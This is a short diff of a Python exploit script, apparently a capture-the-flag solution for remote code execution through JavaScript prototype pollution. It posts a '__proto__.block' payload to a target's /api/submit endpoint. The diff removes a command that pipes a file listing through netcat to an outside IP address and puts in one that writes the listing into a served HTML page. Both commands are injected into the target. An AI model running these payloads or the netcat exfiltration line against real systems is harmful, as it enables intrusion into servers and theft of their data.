@@ -11,7 +11,7 @@ host = "http://167.99.89.198:31971"
 #         })
 
 # RCE using javascript prototype pollution
-command = "ls * | nc 20.124.113.160 3000"
+command = "ls * >> views/index.html"
 r = requests.post(host + '/api/submit', json = {
     'artist.name':'Haigh',
     '__proto__.block': {
